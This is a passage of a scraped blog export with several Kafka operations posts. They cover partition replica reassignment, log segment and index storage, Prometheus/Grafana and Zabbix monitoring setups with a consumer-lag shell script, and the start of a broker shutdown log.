--execute[jollybi@kafka1 kafka_2.10-0.9.0.1]$ ./bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file increase-replication-factor.json --executeCurrent partition replica assignment&#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"countly_event\",\"partition\":6,\"replicas\":[4]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":4,\"replicas\":[2]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":5,\"replicas\":[3]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":7,\"replicas\":[1]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":3,\"replicas\":[1]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":9,\"replicas\":[3]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":11,\"replicas\":[1]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":0,\"replicas\":[2]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":10,\"replicas\":[4]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":2,\"replicas\":[4]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":1,\"replicas\":[3]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":8,\"replicas\":[2]&#125;]&#125;Save this to use as the --reassignment-json-file option during rollbackSuccessfully started reassignment of partitions &#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"countly_event\",\"partition\":0,\"replicas\":[1,2,3,4]&#125;]&#125; –verify选项可与该工具一起使用，以检查分区重新分配的状态。请注意，与–verify选项一起使用相同的increase-replication-factor.json（与–execute选项一起使用） 1234567891011121314151617181920212223242526272829303132[jollybi@kafka1 kafka_2.10-0.9.0.1]$ ./bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file increase-replication-factor.json --verifyStatus of partition reassignment:Reassignment of partition [countly_event,0] is still in progressReassignment of partition [countly_event,1] is still in progressReassignment of partition [countly_event,2] is still in progressReassignment of partition [countly_event,3] is still in progressReassignment of partition [countly_event,4] is still in progressReassignment of partition [countly_event,5] is still in progressReassignment of partition [countly_event,6] is still in progressReassignment of partition [countly_event,7] is still in progressReassignment of partition [countly_event,8] is still in progressReassignment of partition [countly_event,9] is still in progressReassignment of partition [countly_event,10] is still in progressReassignment of partition [countly_event,11] is still in progress您还可以使用kafka-topics工具验证复制因子的增加情况 [root@kafka1 kafka_2.10-0.9.0.1]# ./bin/kafka-topics.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 -describe -topic countly_eventTopic:countly_event PartitionCount:12 ReplicationFactor:3 Configs: Topic: countly_event Partition: 0 Leader: 2 Replicas: 3,2,4 Isr: 2,3,4 Topic: countly_event Partition: 1 Leader: 3 Replicas: 3,2,4 Isr: 3,2,4 Topic: countly_event Partition: 2 Leader: 4 Replicas: 4,3,1 Isr: 4,1,3 Topic: countly_event Partition: 3 Leader: 1 Replicas: 2,1,3 Isr: 1,2,3 Topic: countly_event Partition: 4 Leader: 3 Replicas: 3,4,1 Isr: 4,1,3 Topic: countly_event Partition: 5 Leader: 4 Replicas: 4,1,2 Isr: 1,4,2 Topic: countly_event Partition: 6 Leader: 1 Replicas: 1,2,3 Isr: 2,1,3 Topic: countly_event Partition: 7 Leader: 2 Replicas: 2,3,4 Isr: 4,2,3 Topic: countly_event Partition: 8 Leader: 2 Replicas: 3,1,2 Isr: 2,1,3 Topic: countly_event Partition: 9 Leader: 3 Replicas: 4,2,3 Isr: 3,2,4 Topic: countly_event Partition: 10 Leader: 4 Replicas: 1,3,4 Isr: 4,1,3 Topic: countly_event Partition: 11 Leader: 1 Replicas: 2,4,1 Isr: 1,4,2 参考地址：http://kafka.apache.org/documentation/ Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/07/21/Bigdata-hadoop/Kafka/Kafka动态增加Topic的副本(Replication)/"},{"title":"Kafka日志存储解析与实践数据存储优化","text":"Kafka的名词解释kafka是一款分布式消息发布和订阅的系统，具有高性能和高吞吐率。 1，Broker： 一个单独的kafka机器节点就称为一个broker，多个broker组成的集群，称为kafka集群 2，Topic：类似数据库中的一个表，我们将数据存储在Topic里面，当然这只是逻辑上的，在物理上，一个Topic 可能被多个Broker分区存储，这对用户是透明的，用户只需关注消息的产生于消费即可. 3，Partition：类似分区表，每个Topic可根据设置将数据存储在多个整体有序的Partition中，每个顺序化partition会生成2个文件，一个是index文件一个是log文件，index文件存储索引和偏移量，log文件存储具体的数据. 4，Producer：生产者，向Topic里面发送消息的角色 5，Consumer：消费者，从Topic里面读取消息的角色 6，Consumer Group：每个Consumer属于一个特定的消费者组，可为Consumer指定group name，如果不指定默认属于group 集群安装略过~ 日志存储Kafka的data是保存在文件系统中的。Kafka中的Message是以topic为基本单位组织的，不同的topic之间是相互独立的。 每个topic又可以分成几个不同的partition，每个topic有几个partition是在创建topic时指定的，每个partition存储一部分Message。 partition是以文件的形式存储在文件系统中，比如，创建了一个名为kakfa-node1的topic，其有12个partition，那么在Kafka的数据目录中(由配置文件中的log.dirs指定的)中就有这样5个目录: 12345678910111213[jollybi@kafka1 kafka-logs]$ lldrwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-0drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-1drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-10drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-11drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-2drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-3drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-4drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-5drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-6drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-7drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-8drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-9 其命名规则为&lt;topic_name&gt;-&lt;partition_id&gt;，里面存储的分别就是这12个partition的数据。zookeeper会将分区平均分配创建到不同的broker上，例如 1234567891011121314[jollybi@kafka1 tools]$ ./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --describe --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --topic kakfa-node1Topic:kakfa-node1 PartitionCount:12 ReplicationFactor:3 Configs: Topic: kakfa-node1 Partition: 0 Leader: 1 Replicas: 1,2,3 Isr: 1,2,3 Topic: kakfa-node1 Partition: 1 Leader: 2 Replicas: 2,3,1 Isr: 2,3,1 Topic: kakfa-node1 Partition: 2 Leader: 3 Replicas: 3,1,2 Isr: 3,1,2 Topic: kakfa-node1 Partition: 3 Leader: 1 Replicas: 1,3,2 Isr: 1,3,2 Topic: kakfa-node1 Partition: 4 Leader: 2 Replicas: 2,1,3 Isr: 2,1,3 Topic: kakfa-node1 Partition: 5 Leader: 3 Replicas: 3,2,1 Isr: 3,2,1 Topic: kakfa-node1 Partition: 6 Leader: 1 Replicas: 1,2,3 Isr: 1,2,3 Topic: kakfa-node1 Partition: 7 Leader: 2 Replicas: 2,3,1 Isr: 2,3,1 Topic: kakfa-node1 Partition: 8 Leader: 3 Replicas: 3,1,2 Isr: 3,1,2 Topic: kakfa-node1 Partition: 9 Leader: 1 Replicas: 1,3,2 Isr: 1,3,2 Topic: kakfa-node1 Partition: 10 Leader: 2 Replicas: 2,1,3 Isr: 2,1,3 Topic: kakfa-node1 Partition: 11 Leader: 3 Replicas: 3,2,1 Isr: 3,2,1 Isr表示分区创建在哪个broker上。Partition中的每条Message由offset来表示它在这个partition中的偏移量，这个offset不是该Message在partition数据文件中的实际存储位置，而是逻辑上一个值，它唯一确定了partition中的一条Message。因此，可以认为offset是partition中Message的id。partition中的每条Message包含了以下三个属性： 123offsetMessageSizedata 其中offset为long型，MessageSize为int32，表示data有多大，data为message的具体内容。 Kafka通过分段和索引的方式来提高查询效率 1）分段 Kafka解决查询效率的手段之一是将数据文件分段，比如有100条Message，它们的offset是从0到99。假设将数据文件分成5段，第一段为0-19，第二段为20-39，以此类推，每段放在一个单独的数据文件里面，数据文件以该段中最小的offset命名。这样在查找指定offset的Message的时候，用二分查找就可以定位到该Message在哪个段中。 1234567891011121314[jollybi@kafka1 kafka-logs]$ ll /data/tools/kafka_2.10-0.8.2.1/kafka-logs/total 548drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-0drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-1drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-10drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-11drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-2drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-3drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-4drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-5drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-6drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-7drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-8drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-9 2）为数据文件建索引数据文件分段使得可以在一个较小的数据文件中查找对应offset的Message了，但是这依然需要顺序扫描才能找到对应offset的Message。为了进一步提高查找的效率，Kafka为每个分段后的数据文件建立了索引文件，文件名与数据文件的名字是一样的，只是文件扩展名为.index。索引文件中包含若干个索引条目，每个条目表示数据文件中一条Message的索引。索引包含两个部分（均为4个字节的数字），分别为相对offset和position。 相对offset：因为数据文件分段以后，每个数据文件的起始offset不为0，相对offset表示这条Message相对于其所属数据文件中最小的offset的大小。举例，分段后的一个数据文件的offset是从20开始，那么offset为25的Message在index文件中的相对offset就是25-20 = 5。存储相对offset可以减小索引文件占用的空间。 position，表示该条Message在数据文件中的绝对位置。只要打开文件并移动文件指针到这个position就可以读取对应的Message了。index文件中并没有为数据文件中的每条Message建立索引，而是采用了稀疏存储的方式，每隔一定字节的数据建立一条索引。这样避免了索引文件占用过多的空间，从而可以将索引文件保留在内存中。但缺点是没有建立索引的Message也不能一次定位到其在数据文件的位置，从而需要做一次顺序扫描，但是这次顺序扫描的范围就很小了。 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/03/30/Bigdata-hadoop/Kafka/Kafka日志存储解析与实践数据存储优化/"},{"title":"Monitor Kafka with Prometheus +Grafana","text":"Monitoring Kafka with PrometheusWe’ve previously looked at how to monitor Cassandra with Prometheus. Let’s see the process for getting metrics from another popular Java application, Kafka. we download Kafka, the JMX exporter and the config file: 12345678910111213141516171819wget http://ftp.heanet.ie/mirrors/www.apache.org/dist/kafka/0.10.1.0/kafka_2.11-0.10.1.0.tgztar -xzf kafka _ *。tgzcd kafka_ *wget https://repo1.maven.org/maven2/io/prometheus/jmx/jmx_prometheus_javaagent/0.6/jmx_prometheus_javaagent-0.6.jarwget https://raw.githubusercontent.com/prometheus/jmx_exporter/master/example_configs/kafka-0-8-2.ymlDownload the good files and put them under the Kafka directory:[hadoop@hadoop6 kafka_2.10-0.9.0.1]$ lldrwxr-xr-x 3 hadoop hadoop 4096 9月 27 13:34 bindrwxr-xr-x 2 hadoop hadoop 4096 9月 27 21:18 config-rw-rw-r-- 1 hadoop hadoop 1225418 2月 5 2016 jmx_prometheus_javaagent-0.6.jar-rw-rw-r-- 1 hadoop hadoop 2824 9月 26 17:48 kafka-0-8-2.ymldrwxr-xr-x 2 hadoop hadoop 4096 9月 27 13:31 libs-rw-r--r-- 1 hadoop hadoop 11358 2月 12 2016 LICENSEdrwxrwxr-x 2 hadoop hadoop 266240 9月 27 21:19 logs-rw-r--r-- 1 hadoop hadoop 162 2月 12 2016 NOTICEdrwxrwxr-x 5 hadoop hadoop 4096 9月 27 15:56 prometheus-1.2.1.linux-amd64drwxr-xr-x 2 hadoop hadoop 4096 2月 12 2016 site-docs We start a Zookeeper (a Kafka dependency) and Kafka with the JMX exporter running as a Java agent: 1234567891011121314151617181920First step:Configure the zookeeper zoo.zoo.cfg port: 2181Start zookeeper:./zookeeper-3.4.6/bin/zkServer.sh startSecond steps:Configuration modification: kafka_2.10-0.9.0.1/config/zookeeper.propertiesPort modification: 2182 do not conflict with the zookeeper service portdataDir=/data2/zookeeper-3.4.6/zookeeper-data# the port at which the clients will connectclientPort=2181# disable the per-ip limit on the number of connections since this is a non-production configmaxClientCnxns=0./bin/zookeeper-server-start.sh config/zookeeper.properties &amp;KAFKA_OPTS=\"$KAFKA_OPTS -javaagent:$PWD/jmx_prometheus_javaagent-0.6.jar=7071:$PWD/kafka-0-8-2.yml\" \\./bin/kafka-server-start.sh config/server.properties &amp; If you visit http://localhost:7071/metrics you’ll see the metrics.Let’s setup a quick Prometheus server: 1234567891011121314wget https://github.com/prometheus/prometheus/releases/download/v1.2.1/prometheus-1.2.1.linux-amd64.tar.gztar -xzf prometheus-*.tar.gzcd prometheus-*cat &lt;&lt;'EOF' &gt; prometheus.ymlglobal: scrape_interval: 10s evaluation_interval: 10sscrape_configs: - job_name: 'kafka' static_configs: - targets: - localhost:7071EOF./prometheus Following run access: http://localhost:9090/graph 123456789[hadoop@hadoop8 prometheus-1.2.1.linux-amd64]$ ./prometheusINFO[0000] Starting prometheus (version=1.2.1, branch=master, revision=dd66f2e94b2b662804b9aa1b6a50587b990ba8b7) source=main.go:75INFO[0000] Build context (go=go1.7.1, user=root@fd9b0daff6bd, date=20161010-15:58:23) source=main.go:76INFO[0000] Loading configuration file prometheus.yml source=main.go:247INFO[0000] Loading series map and head chunks... source=storage.go:354INFO[0000] 49 series loaded. source=storage.go:359WARN[0000] No AlertManagers configured, not dispatching any alerts source=notifier.go:176INFO[0000] Listening on :9090 source=web.go:240INFO[0000] Starting target manager... source=targetmanager.go:76 The Prometheus platform monitors all data from the Kafka index:This function is very powerful, late will explain what each representative means: Install open source Grafana monitoring, combine prometheus.io to obtain Prometheus platform data. Installing Grafana1234567# Download and unpack Grafana from binary tar (adjust version as appropriate).curl -L -O https://grafanarel.s3.amazonaws.com/builds/grafana-2.5.0.linux-x64.tar.gztar zxf grafana-2.5.0.linux-x64.tar.gz# Start Grafana.cd grafana-2.5.0/./bin/grafana-server web UsingBy default, Grafana will be listening on http://localhost:3000. The default login is “admin” / “admin”. Creating a Prometheus data sourceTo create a Prometheus data source: Click on the Grafana logo to open the sidebar menu. Click on “Data Sources” in the sidebar. Click on “Add New”. Select “Prometheus” as the type. Set the appropriate Prometheus server URL (for example, http://localhost:9090/) Adjust other data source settings as desired (for example, turning the proxy access off). Click “Add” to save the new data source. The following shows an example data source configuration: Reference address: GRAFANA SUPPORT FOR PROMETHEUS Finally load the Kafka Overview dashboard from grafana.net into your Grafana to get the above console! If you want to run Kafka inside docker, there’s another blog post covering that. Reference address: monitoring-kafka-with-prometheus Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/08/04/Bigdata-hadoop/Kafka/Monitor Kafka with Prometheus +Grafana/"},{"title":"Zabbix-Monitoring Kafka集群 Consumer | kafka的监控和告警","text":"Zabbix-Monitoring Kafka集群 Consumer | kafka的监控和告警前面一篇讲了我们监控kafka集群Brokers服务状态监控。生产环境监控，可以在Zabbix中对Kafka进行监控，一种是监控JMX端口，另外一种是直接写脚本，使用bin/kafka-run-class.sh里提供的相关方法类。 根据我们的业务场景，最为主要的的是监控消费者Lag的情况。所有我直接写脚本了。我们对某一个Topic的30个分区，每个分区，当前Consumer的Lag情况。当然还可以生成汇总图，在此不做多展示。在Zabbix中配置对应的Triggers，当Lag超过阀值，实现报警。 这里我用命令在kafka当中一台服务器获取了其中一个Topic group的Lag。 1234567891011121314151617[jollybi@countly2 kafka_2.10]$ bin/kafka-run-class.sh kafka.tools.ConsumerOffsetChecker --zookeeper 75.126.39.4:2281,75.126.5.2:2281,75.126.5.1:2281 --group group_zybi --topic mongotail_lz4 消费组 话题id 分区ID 当前已消费的条数 总条数 未消费的 Group Topic Pid Offset logSize Lag Ownergroup_zybi mongotail_lz4 0 1092163900 2253744158 1161580258 nonegroup_zybi mongotail_lz4 1 1092281117 2253795899 1161514782 nonegroup_zybi mongotail_lz4 2 1092834883 2253771036 1160936153 nonegroup_zybi mongotail_lz4 3 1092822121 2253772916 1160950795 nonegroup_zybi mongotail_lz4 4 1092040532 2253775432 1161734900 nonegroup_zybi mongotail_lz4 5 1095163824 2253744329 1158580505 nonegroup_zybi mongotail_lz4 6 1097623779 2253781500 1156157721 nonegroup_zybi mongotail_lz4 7 1097459357 2253782032 1156322675 nonegroup_zybi mongotail_lz4 8 1099080546 2253741287 1154660741 nonegroup_zybi mongotail_lz4 9 1099028190 2253785053 1154756863 nonegroup_zybi mongotail_lz4 10 1099535928 2253795680 1154259752 nonegroup_zybi mongotail_lz4 11 1099701993 2253742880 1154040887 none 其实命令大体的逻辑就是通过Consumer获取到当前的offset，就能有lag信息了，如何写成脚本获取我们想要的消费和未消费与总消息条数呢。 脚本贴出来了，很简单理解，把自己获取到topic的消费条数过滤。我公司有两个主题topic分别对不同组获取lag. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[root@countly2 zabbix]# vim monitor_kafka.sh#!/bin/bashexport JAVA_HOME=/home/jollybi/tools/java-7-sunexport CLASSPATH=$CLASSPATH:.:$JAVA_HOME/lib:$JAVA_HOME/jre/libexport PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATHtopic=mongotail_lz4_impgroup=group_imp#topic2topic2=mongotail_lz4group2=group_eventgroup3=group_event_spm#启动目录kafkaserver=/home/jollybi/tools/kafka_2.10-0.8.2.1/bin/kafka-run-class.shzk=75.126.39.4:2281,75.126.5.2:2281,75.126.5.8:2281function imp_lag &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group --topic $topic | sed -n 2p | awk '&#123;print $6&#125;'`\"&#125;function imp_logsize &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group --topic $topic | sed -n 2p | awk '&#123;print $5&#125;'`\"&#125;function imp_offset &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group --topic $topic | sed -n 2p | awk '&#123;print $4&#125;'`\"&#125;function event_spm_lag &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group2 --topic $topic2 | sed -n 2p | awk '&#123;print $6&#125;'`\"&#125;function event_spm_logsize &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group2 --topic $topic2 | sed -n 2p | awk '&#123;print $5&#125;'`\"&#125;function event_spm_offset &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group2 --topic $topic2 | sed -n 2p | awk '&#123;print $4&#125;'`\"&#125;function event_lag &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group3 --topic $topic2 | sed -n 2p | awk '&#123;print $6&#125;'`\"&#125;function event_logsize &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group3 --topic $topic2 | sed -n 2p | awk '&#123;print $5&#125;'`\"&#125;function event_offset &#123;echo \"`$kafkaserver kafka.tools.ConsumerOffsetChecker --zookeeper $zk --group $group3 --topic $topic2 | sed -n 2p | awk '&#123;print $4&#125;'`\"&#125;# Run the requested function$1 ⏰ 这里脚本我更新过了，这个脚本实现是当个分片的消费情况。 不是总的消费和未消费的取到的值。🎋 需要原脚本的留言喔，下面步骤都是一样的效果。 脚本放到kafka服务器/etc/zabbix/下面，并配合zabbix监控。12345[root@countly2 zabbix]# lltotal 8-rwxrwxr-x 1 jollybi jollybi 1932 Jun 7 10:40 monitor_kafka.sh-rw-r--r-- 1 root root 218 Jun 7 14:19 zabbix_agentd.confdrwxr-xr-x 2 root root 45 Sep 20 2016 zabbix_agentd.d 然后zabbix_agentd.conf扩展配置1UserParameter=kafka.[*],/etc/zabbix/monitor_kafka.sh $1 也可以这么写： 123456789UserParameter=kafka.imp_lag,/etc/zabbix/monitor_kafka.sh imp_lagUserParameter=kafka.imp_offset,/etc/zabbix/monitor_kafka.sh imp_offsetUserParameter=kafka.imp_logsize,/etc/zabbix/monitor_kafka.sh imp_logsizeUserParameter=kafka.event_spm_lag,/etc/zabbix/monitor_kafka.sh event_spm_lagUserParameter=kafka.event_spm_logsize,/etc/zabbix/monitor_kafka.sh event_spm_logsizeUserParameter=kafka.event_spm_offset,/etc/zabbix/monitor_kafka.sh event_spm_offset UserParameter=kafka.event_lag,/etc/zabbix/monitor_kafka.sh event_lagUserParameter=kafka.event_offset,/etc/zabbix/monitor_kafka.sh event_offsetUserParameter=kafka.event_logsize,/etc/zabbix/monitor_kafka.sh event_logsize 这里写键值就不需要加[] 然后配置完成重启zabbix-agent服务。 zabbix设置Keyzabbix-组态-模板-创建模板。 创建：KafkaConsumers模板然后点击KafkaConsumers模板，创建相应的项目:kafka.event_lag 未消费的条数 设置zabbix代理。默认的代理方式。 zabbix,key 键值 1kafka.[event_lag] 数据类型默认浮点就可以了。 后面应用集选择下KafkaConsumers 即可。 陆陆续续配置完所有项目。 然后配置图形。 查看最新数据图： 出现问题第一时间发送报警消息。报警的Trigger触发规则也是对lag的值做报警，具体阀值设置为多少，还是看大家各自业务需求了。 这里我对未消费告警定时60分钟触发一次。⚠️注释：设置group_event_lag最近消息条数的60分钟时间之内一直超过200万消费则报警 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/06/05/Bigdata-hadoop/Kafka/Zabbix-Monitoring Kafka Consumer | kafka的监控和告警/"},{"title":"Zabbix监控Kafka集群 Brokers服务","text":"Zabbix监控Kafka集群 Brokers服务 前言：Monitoring Kafka with Datadog This post is the final part of a 3-part series on how to monitor Kafka. Part 1 explores the key metrics available from Kafka, and Part 2 is about collecting those metrics on an ad hoc basis. To implement ongoing, meaningful monitoring, you will need a dedicated system that allows you to store, visualize, and correlate your Kafka metrics with the rest of your infrastructure. Kafka deployments often rely on additional software packages not included in the Kafka codebase itself, in particular Apache ZooKeeper. A comprehensive monitoring implementation includes all the layers of your deployment, including host-level metrics when appropriate, and not just the metrics emitted by Kafka itself. 我在处理Hadoop及相关服务监控、报警这里主要讲kafka集群服务。这里我也看了几篇kafka相关文章，好文贴出来： infoq kafka 入门了解 kafka 工作原理介绍 在我们公司主要Kafka 的几个特性非常满足我们的需求：可扩展性、数据分区、低延迟、处理大量不同消费者的能力。 而这里我想帮忙BI团队实现Kafka全面监控。分两点： 121. 监控Kafka Brokers服务2. 监控Kafka Lag堆积数 对于Kafka的监控，已经有现成的开源软件了，在我们公司内部也使用了一段时间，有两种方案。我们公司用第三种方案。一般都会选择两个开源的工具：KafkaOffsetMonitor和kafka-web-console，这两款我都有用过. Kafka三款监控工具比较 目录 1231、Kafka Web Conslole2、Kafka Manager3、KafkaOffsetMonitor KafkaOffsetMonitor：最大的好处就是配置简单，只需要配个zookeeper的地址就能用了，坑爹的地方就是不能自动刷新，手动刷新时耗时较长，而且有时候都刷不出来，另外就是图像用了一段时间就完全显示不了了，不知道大家是不是这样。 kafka-web-console：相比与前者，数据是落地的，因此刷新较快，而且支持在前端自定义zookeeper的地址，还能列出实时的topic里的具体内容。但是搭建比较复杂，而且github上的默认数据库是H2的，像我们一般用mysql的，还得自己转化。另外在用的过程中，我遇到一个问题，在连接kafka的leader失败的时候，会一直重试，其结果就是导致我kafka的那台机子连接数过高，都到2w了，不知道是不是它的一个bug。 具体介绍以及安装在我另外篇博文。这里不详细讲解开源软件，这里用zabbix监控Kafka Brokers服务。 kafka-monitoring Brokers服务操作系统环境： 123Centos 7.1 64G内存2T磁盘空间，指定kafka写入数据目录。 说明下: 监控Brokers是利用Zabbix JMX监控获取数据。 ☝️第一步：不用解释前提你在zabbix-server端已经安装过abbix-java-gataway 如果没有安装可以看下面，安装过可以略过第一步。 1.0 安装配置zabbix-java-gataway 1234567891011yum install -y zabbix-java-gatawayvi /etc/zabbix/zabbix_java_gateway.confSTART_POLLERS=10 Uncoment并设置为StartJavaPollers = 5 更改JavaGateway的 IP = IP_address_java_gateway``` 1.1 重新启动zabbix-server```bash/etc/init.d/zabbix-java-gataway restartchkconfig --level 345 zabbix-java-gataway on/etc/init.d/zabbix-java-gataway start ☝️第二步：Kafka配置 这里我们服务器给大数据那边安装在指定用户目录下面：/home/jollybi/tools/kafka_2.10-0.8.2.1 123456789101112131415su - jollybi 进入相应用户vim /home/jollybi/tools/kafka_2.10-0.8.2.1/kafka-run-class.sh从# JMX settingsif [ -z \"$KAFKA_JMX_OPTS\" ]; thenKAFKA_JMX_OPTS=\"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false - Dcom.sun.management.jmxremote.ssl=false \"fi至# JMX settingsif [ -z \"$KAFKA_JMX_OPTS\" ]; thenKAFKA_JMX_OPTS=\"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=12345 - Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false \"fi 重启服务： 12/home/jollybi/tools/kafka_2.10-0.8.2.1/bin/kafka-server-stop.sh/home/jollybi/tools/kafka_2.10-0.8.2.1/bin/kafka-server-start.sh ☝️第三步：导入模板登录到您的zabbix网页. 导入模板登录到您的zabbix网页 单击配置 - &gt;模板 - &gt;导入 下载模板 zbx_kafka_templates.xml 并上传到zabbix然后将此模板添加到Kafka并在zabbix上配置JMX接口 输入Kafka IP地址和JMX端口如果看到jmx图标，您配置了JMX监控好！ 查看数据： 查看效果图： 参考官网监控指标的含义; Servilo Metrics broker MetricsProducer Metrics Global Request MetricsGlobal Connection Metrics 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/06/01/Bigdata-hadoop/Kafka/Zabbix监控Kafka集群 Brokers服务/"},{"title":"kafka总是在启动一段时间后自动停止","text":"kafka总是在启动一段时间后自动停止123456789101112131415161718192021222324252627282930313233343536373839404142[2018-04-01 11:24:08,269] INFO [ReplicaFetcherManager on broker 2] Removed fetcher for partitions [namespace_jolly_brands_zy702_who_wms_order_user_info,2] (kafka.server.ReplicaFetcherManager)[2018-04-01 11:24:08,269] INFO Truncating log namespace_jolly_brands_zy702_who_wms_order_user_info-2 to offset 69346. (kafka.log.Log)[2018-04-01 11:24:08,292] INFO [Socket Server on Broker 2], Shutdown completed (kafka.network.SocketServer)[2018-04-01 11:24:08,294] INFO [Kafka Request Handler on Broker 2], shutting down (kafka.server.KafkaRequestHandlerPool)[2018-04-01 11:24:08,353] INFO [Kafka Request Handler on Broker 2], shut down completely (kafka.server.KafkaRequestHandlerPool)[2018-04-01 11:24:08,368] INFO [ThrottledRequestReaper-Produce], Shutting down (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:08,856] INFO [ThrottledRequestReaper-Produce], Stopped (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:08,857] INFO [ThrottledRequestReaper-Produce], Shutdown completed (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:08,857] INFO [ThrottledRequestReaper-Fetch], Shutting down (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:09,847] INFO [ThrottledRequestReaper-Fetch], Stopped (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:09,847] INFO [ThrottledRequestReaper-Fetch], Shutdown completed (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:09,848] INFO [KafkaApi-2] Shutdown complete. (kafka.server.KafkaApis)[2018-04-01 11:24:09,852] INFO [Replica Manager on Broker 2]: Shutting down (kafka.server.ReplicaManager)[2018-04-01 11:24:09,855] INFO [ReplicaFetcherManager on broker 2] shutting down (kafka.server.ReplicaFetcherManager)[2018-04-01 11:24:09,856] INFO [ReplicaFetcherThread-0-4], Shutting down 